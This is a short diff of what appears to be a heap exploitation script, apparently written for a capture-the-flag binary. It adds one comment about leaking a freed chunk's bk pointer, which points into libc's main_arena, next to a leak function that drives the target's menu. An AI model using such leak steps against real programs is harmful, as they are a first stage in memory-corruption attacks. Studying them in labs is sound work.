@@ -41,6 +41,8 @@ def leak_after_one_free():
 # the 1st free chunk -> fd points the 2nd free chunk (bk points <main_arena>)
 # the 2nd free chunk -> bk points the 1st free chunk (fd points <main_arena>)
 #
+# we are going to leak this bk pointer.
+#
 def leak_after_two_free():
     r.send('1\n')
     r.recvuntil('DDDDDDDD')
